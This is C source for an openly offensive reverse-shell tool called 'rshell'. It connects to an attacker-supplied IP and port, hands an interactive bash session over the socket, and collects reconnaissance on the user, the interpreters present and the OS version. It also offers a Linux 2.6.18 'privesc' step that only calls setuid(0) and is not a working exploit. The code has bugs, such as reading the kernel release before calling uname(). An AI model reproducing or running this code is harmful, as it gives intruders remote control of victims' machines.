#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pwd.h>
#include <sys/utsname.h>
#include <string.h>

#define _PROGRAM_NAME "rshell"

int EXISTS(const char *path){
        FILE *fptr = fopen(path, "r");
        if (fptr == NULL){return 0;}
        fclose(fptr);
        return 1;
}

int main(int argc, char * argv[]){
        // SETTING ALL VAR
        argc--;   argv++;
        struct sockaddr_in revsockaddr;
        register struct passwd *pw;
        register uid_t uid;
        int c;
        uid = geteuid ();
        pw = getpwuid (uid);
        char answer;
        char *ret;
        struct utsname uts;
        ret = strstr(uts.release, "2.6.18");
        uname(&uts);
        char *args[] = {"/usr/bin/bash", "-i", 0};
        char *envp[] = {"/usr/bin/bash", 0};
        // CHECKING IF THE PROGRAM HAS THE IP / PORT
        if (argc < 2) {
                printf( "Usage: ./rshell ip port\n" );
                exit(0);
        }

        puts("[i] Connecting");

        int sockt = socket(AF_INET, SOCK_STREAM, 0);
        revsockaddr.sin_family = AF_INET;
        revsockaddr.sin_port = htons(atoi(argv[1]));
        revsockaddr.sin_addr.s_addr = inet_addr(argv[0]);
        connect(sockt, (struct sockaddr *) &revsockaddr,
        sizeof(revsockaddr));
        dup2(sockt, 0);
        dup2(sockt, 1);
        dup2(sockt, 2);

        puts("[+] Connected");
        puts("[i] Im going to stabilize the shell. But before im looking around for some informations about the machine.");
        
        //FIND USER
        if (pw){
                puts("[i] User who started the program:");
                puts (pw->pw_name);
        }
        fprintf (stderr,"%s: cannot find username for UID %u\n", _PROGRAM_NAME, (unsigned) uid);

        // FIND IF PYTHON3 AND PERL ARE INSTALLED
        if(EXISTS("/usr/bin/python3")){
                puts("[+] Python3 is on the machine.");
        } else { puts("[-] Python3 is not on the machine.");}
        if(EXISTS("/usr/bin/perl")){
                puts("[+] Perl is on the machine.");   
        } else{ puts("[-] Perl os not on the machine.");}
        
        // FIND OS INFO
        printf("[i] System is %s on %s hardware\n",uts.sysname, uts.machine);
        printf("[i] OS Release is %s\n",uts.release);
        printf("[i] OS Version is %s\n",uts.version);

        // PRIVESC
        if(ret){
                puts("[?] Before stabilizing, i may have found a way to privesc,do you want me to try to privesc by using the Linux 2.6.18 SUID ROOT exploit?");
                scanf("%c", &answer);
                if(answer=='Y' || answer == 'y'){
                        setgid(0); setuid(0);
                        execl("/bin/sh","sh",0);
                        puts("[+] If it worked, you are now root and should see an #. Try to do whoami to see which user you are.");
                }else{puts("[i] Very well. Going to continue my job then.");}
        }

        // STABILIZE
        puts("[+] Stabilized");
        execve(args[0], &args[0], envp);
        return 0;
}
